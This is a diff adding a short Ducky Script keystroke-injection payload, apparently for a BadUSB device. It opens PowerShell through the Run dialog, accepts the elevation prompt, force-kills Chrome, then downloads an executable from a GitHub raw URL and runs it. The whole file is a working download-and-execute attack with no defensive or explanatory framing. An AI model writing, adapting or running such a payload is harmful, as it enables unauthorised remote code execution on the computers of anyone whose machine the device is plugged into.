@@ -1,0 +1,14 @@
+DELAY 750  
+GUI r 
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2500
+ALT y 
+DELAY 1000
+ENTER
+STRING taskkill /im chrome.exe /f
+ENTER
+DELAY 1500
+STRING (New-Object Net.Webclient).DownloadFile('https://github.com/yellowsubmarine1447/for-fun/raw/master/lmao.exe','40637.exe'); Start-Process -wait cmd '/c 40637.exe' -nonewwindow
+ENTER
